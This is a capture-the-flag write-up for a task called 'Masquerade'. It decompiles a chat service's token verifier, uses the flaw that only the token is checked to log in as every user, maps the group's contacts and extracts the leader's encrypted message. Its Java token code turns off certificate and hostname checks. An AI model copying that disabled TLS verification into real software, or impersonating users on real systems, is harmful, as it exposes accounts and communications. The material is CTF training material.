## Task 05 - Masquerade

* Use [uncompyle6](https://github.com/rocky/python-uncompyle6) to decompile Python bytecode [auth_verify.pyc](./auth_verify.pyc) back to Python source code.

```shell
$ file auth_verify.pyc
auth_verify.pyc: python 2.7 byte-compiled

$ uncompyle6 -o . auth_verify.pyc 
auth_verify.pyc -- 
# Successfully decompiled file
```

* The decompiled file `auth_verify.py` can be found [here](../assets/auth_verify.py).
* By examining the `auth_verify.py`, we can see that the authorization server only checks validity of the token. It means that if we have a valid token, we can bypass the authentication with any username we choose.
* The code snippet below shows how to obtain a token

```java
	/**
	 * Get access token from register.terrortime.app server
	 * 
	 * @return JSONObject access token object. Otherwise, null
	 */
	public JSONObject getToken() {
		JSONObject jsonTokenResponse = null;

		try {
			String authServer = "https://register.terrortime.app/oauth2/token";
			int port = 443;
			String grantType = "client_credentials";
			String scope = "chat";
			String audience = "";

			String authorization = "Basic " + getBase64AuthorizationString(clientId, clientSecret);

			URL authServerUrl = new URL(authServer);
			URL connectURL = new URL(authServerUrl.getProtocol(), authServerUrl.getHost(), port,
					authServerUrl.getFile());
			SSLContext sslContext = createAcceptAllCertsContext();
			HttpsURLConnection connect = (HttpsURLConnection) connectURL.openConnection();
			connect.setSSLSocketFactory(sslContext.getSocketFactory());
			connect.setHostnameVerifier(new HostnameVerifier() {
				public boolean verify(String hostname, SSLSession session) {
					return true;
				}
			});
			connect.setRequestMethod("POST");
			connect.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
			connect.setRequestProperty("Authorization", authorization);
			connect.setRequestProperty("X-Server-Select", "oauth");
			connect.setDoInput(true);
			connect.setDoOutput(true);
			connect.setUseCaches(false);
			connect.setReadTimeout(30000);
			connect.setConnectTimeout(30000);

			StringBuilder postBuilder = new StringBuilder();
			postBuilder.append("audience=" + audience + "&");
			postBuilder.append("grant_type=" + grantType + "&");
			postBuilder.append("scope=" + scope);

			OutputStream postStream = new BufferedOutputStream(connect.getOutputStream());
			byte[] tx = postBuilder.toString().getBytes(org.jivesoftware.smack.util.StringUtils.UTF8);
			StringBuilder sb3 = new StringBuilder();
			sb3.append("Requesting token. Destination: ");
			sb3.append(authServer);
			sb3.append(". Authorization property: ");
			sb3.append(authorization);
			sb3.append(". Request: ");
			sb3.append(postBuilder.toString());
			postStream.write(tx, 0, tx.length);
			postStream.close();
			StringBuffer responseBuffer = new StringBuffer();
			InputStream inStream = connect.getInputStream();
			InputStreamReader inStreamReader = new InputStreamReader(inStream);
			BufferedReader inResponse = new BufferedReader(inStreamReader);
			String line;
			while (true) {
				String readLine = inResponse.readLine();
				line = readLine;
				if (readLine == null) {
					break;
				}
				responseBuffer.append(line);
			}
			if (responseBuffer.toString().length() != 0) {
				String responseFromHydra = responseBuffer.toString();
				jsonTokenResponse = new JSONObject(responseFromHydra);
				return jsonTokenResponse;
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}
```

* Run the [TerrorTimeSol](../assets/TerrorTimeSol) project in Eclipse to get all the accounts as follow:
```
[*] Find all the accounts...

[*] Login as elias--vhost-1310
[+] Contact list of elias--vhost-1310
        mendel--vhost-1310@terrortime.app [cell-0--vhost-1310]
        amina--vhost-1310@terrortime.app [cell-0--vhost-1310]
[*] Connection closed

[*] Login as mendel--vhost-1310
[+] Contact list of mendel--vhost-1310
        mackenzie--vhost-1310@terrortime.app [management--vhost-1310]
        amina--vhost-1310@terrortime.app [cell-0--vhost-1310]
        elias--vhost-1310@terrortime.app [cell-0--vhost-1310]
        julianna--vhost-1310@terrortime.app [management--vhost-1310]
        zara--vhost-1310@terrortime.app [management--vhost-1310]
[*] Connection closed

[*] Login as amina--vhost-1310
[+] Contact list of amina--vhost-1310
        mendel--vhost-1310@terrortime.app [cell-0--vhost-1310]
        elias--vhost-1310@terrortime.app [cell-0--vhost-1310]
[*] Connection closed

[*] Login as mackenzie--vhost-1310
[+] Contact list of mackenzie--vhost-1310
        mendel--vhost-1310@terrortime.app [management--vhost-1310]
        edward--vhost-1310@terrortime.app [cell-2--vhost-1310]
        julianna--vhost-1310@terrortime.app [management--vhost-1310]
        paris--vhost-1310@terrortime.app [cell-2--vhost-1310]
        zara--vhost-1310@terrortime.app [management--vhost-1310]
[*] Connection closed

[*] Login as julianna--vhost-1310
[+] Contact list of julianna--vhost-1310
        mackenzie--vhost-1310@terrortime.app [management--vhost-1310]
        mendel--vhost-1310@terrortime.app [management--vhost-1310]
        zara--vhost-1310@terrortime.app [management--vhost-1310]
[*] Connection closed

[*] Login as zara--vhost-1310
[+] Contact list of zara--vhost-1310
        mackenzie--vhost-1310@terrortime.app [management--vhost-1310]
        mendel--vhost-1310@terrortime.app [management--vhost-1310]
        julianna--vhost-1310@terrortime.app [management--vhost-1310]
        kendra--vhost-1310@terrortime.app [cell-1--vhost-1310]
        maximus--vhost-1310@terrortime.app [cell-1--vhost-1310]
[*] Connection closed

[*] Login as edward--vhost-1310
[+] Contact list of edward--vhost-1310
        mackenzie--vhost-1310@terrortime.app [cell-2--vhost-1310]
        paris--vhost-1310@terrortime.app [cell-2--vhost-1310]
[*] Connection closed

[*] Login as paris--vhost-1310
[+] Contact list of paris--vhost-1310
        mackenzie--vhost-1310@terrortime.app [cell-2--vhost-1310]
        edward--vhost-1310@terrortime.app [cell-2--vhost-1310]
[*] Connection closed

[*] Login as kendra--vhost-1310
[+] Contact list of kendra--vhost-1310
        zara--vhost-1310@terrortime.app [cell-1--vhost-1310]
        maximus--vhost-1310@terrortime.app [cell-1--vhost-1310]
[*] Connection closed

[*] Login as maximus--vhost-1310
[+] Contact list of maximus--vhost-1310
        kendra--vhost-1310@terrortime.app [cell-1--vhost-1310]
        zara--vhost-1310@terrortime.app [cell-1--vhost-1310]
[*] Connection closed

# NOTE: From the output above, we can deduce that Julanna is the top leader

[*] Print the last encrypted message
[*] Please enter the username: julianna

[*] Login as julianna--vhost-1310
[+] The last encrypted message:

{
    "messageKey": {
        "1bko73X2ScbqNJjo3nhdfaZiB7kPMIuXYELoLKkY7ck=":
        "DJwegqcVfZUosx7UXrdWPYKBuMGlgiiqUa1vH0F5rmNDvgUqpaboeq0jn/qfebqRzaRGM8XVj103n9df3QfkLquGVJ8rNuVDOyoVVW8CITybuLiLAwslzequ7rFjcF+oyU02Y5FVfMF2o0B/aiTnir6doXD77N9Sny9EP+ZC91qHFdJKVj75eoEyaPLM5aP0/nidPgoZJOltyOs2tQ6x6sFdt5KaVn1Hb3wa2ZCehazO+P/6eVLJ/bQzpM1GJ9W7eQJKP+5+/e4T44fWqGHuEFGqDA0inVKmfPjl+RY879noJ693gFEd2rXhA2I0RN//6FiUp9c5rC2z54iNLuxN9A==",
        "3HWH19mo3hlMwmLvse3FFC0SFwF1jN8d6ATFnesSxDo=":
        "G27qKxPBSLpqBOeO0FJAm/XpWEVS8OyczxQCThex22BjPE8rOy4pSaEGFZ1sgN0bD+IostzJTzmUq1nt+XKH5fnwBf64/H005YSBNmeym4JeJ58Fc+TVo9YzYOP0EpNCF7vcJRHTwQQ3XvtzqzglCHjbszjZ8eagSNKmjKmHbSHanHIiJXGFYqSCXTv2eNWG0TlmI0+T1jb+1pTJSndXAGk8o2Ocx1HMJmXpTSCyxh4k2zMwEto1kYYbs3jxEDvrdx7+VcnBpOxrzTvIC53+d/WYQMJ5w6MWqJaOfRkhAc87cnT7ykdaOk2PEmqxYf9T/tXn4NqewnGNITM/JJ4mQw=="
    },
    "messageSig": "OcrZcQxT+OgKyMsBr+eAGV4ItUSLgc7BPFZEzLISPS0=",
    "message": {
        "msg":
        "La1f7Gzb+rXI4mfWDEuI0fJ1wyeQWZAS2znMF5DDrbSGc3Z1O+T/CDixKaaEcOaNnZyUtH2GzjQvCYt6iYAYjFz0arkpG6mEQbu/2qb1kQ038cv4x8A4558mXDpUNlAupBmDflgi9n3QzyCInibmrpFbemUXyWUayfdgGK138/tgYju8O44QQsIGK9j9rh0eFvLnEoiZymT0DDiKPsLAnyqhyrnWLugP7wgQGwKykdDOye81MenTacPBk1GFGKJ6QcR5FVnYt04SsIAAO6FPYg==",
        "iv": "D28yrZcXgqtZcyfL0ugewg=="
    }
}
```

### Summary
1. Username list:
* `elias--vhost-1310@terrortime.app [cell-0--vhost-1310]`
* `mendel--vhost-1310@terrortime.app [cell-0--vhost-1310]`
* `amina--vhost-1310@terrortime.app [cell-0--vhost-1310]`
* `mackenzie--vhost-1310@terrortime.app [management--vhost-1310]`
* `julianna--vhost-1310@terrortime.app [management--vhost-1310]`
* `zara--vhost-1310@terrortime.app [management--vhost-1310]`
* `edward--vhost-1310@terrortime.app [cell-2--vhost-1310]`
* `paris--vhost-1310@terrortime.app [cell-2--vhost-1310]`
* `kendra--vhost-1310@terrortime.app [cell-1--vhost-1310]`
* `maximus--vhost-1310@terrortime.app [cell-1--vhost-1310]`

2. Top organization leader:
`julianna--vhost-1310@terrortime.app [management--vhost-1310]`

3. The last encrypted message in the chat history of the organization leader:
```
{
    "messageKey": {
        "1bko73X2ScbqNJjo3nhdfaZiB7kPMIuXYELoLKkY7ck=":
        "DJwegqcVfZUosx7UXrdWPYKBuMGlgiiqUa1vH0F5rmNDvgUqpaboeq0jn/qfebqRzaRGM8XVj103n9df3QfkLquGVJ8rNuVDOyoVVW8CITybuLiLAwslzequ7rFjcF+oyU02Y5FVfMF2o0B/aiTnir6doXD77N9Sny9EP+ZC91qHFdJKVj75eoEyaPLM5aP0/nidPgoZJOltyOs2tQ6x6sFdt5KaVn1Hb3wa2ZCehazO+P/6eVLJ/bQzpM1GJ9W7eQJKP+5+/e4T44fWqGHuEFGqDA0inVKmfPjl+RY879noJ693gFEd2rXhA2I0RN//6FiUp9c5rC2z54iNLuxN9A==",
        "3HWH19mo3hlMwmLvse3FFC0SFwF1jN8d6ATFnesSxDo=":
        "G27qKxPBSLpqBOeO0FJAm/XpWEVS8OyczxQCThex22BjPE8rOy4pSaEGFZ1sgN0bD+IostzJTzmUq1nt+XKH5fnwBf64/H005YSBNmeym4JeJ58Fc+TVo9YzYOP0EpNCF7vcJRHTwQQ3XvtzqzglCHjbszjZ8eagSNKmjKmHbSHanHIiJXGFYqSCXTv2eNWG0TlmI0+T1jb+1pTJSndXAGk8o2Ocx1HMJmXpTSCyxh4k2zMwEto1kYYbs3jxEDvrdx7+VcnBpOxrzTvIC53+d/WYQMJ5w6MWqJaOfRkhAc87cnT7ykdaOk2PEmqxYf9T/tXn4NqewnGNITM/JJ4mQw=="
    },
    "messageSig": "OcrZcQxT+OgKyMsBr+eAGV4ItUSLgc7BPFZEzLISPS0=",
    "message": {
        "msg":
        "La1f7Gzb+rXI4mfWDEuI0fJ1wyeQWZAS2znMF5DDrbSGc3Z1O+T/CDixKaaEcOaNnZyUtH2GzjQvCYt6iYAYjFz0arkpG6mEQbu/2qb1kQ038cv4x8A4558mXDpUNlAupBmDflgi9n3QzyCInibmrpFbemUXyWUayfdgGK138/tgYju8O44QQsIGK9j9rh0eFvLnEoiZymT0DDiKPsLAnyqhyrnWLugP7wgQGwKykdDOye81MenTacPBk1GFGKJ6QcR5FVnYt04SsIAAO6FPYg==",
        "iv": "D28yrZcXgqtZcyfL0ugewg=="
    }
}
```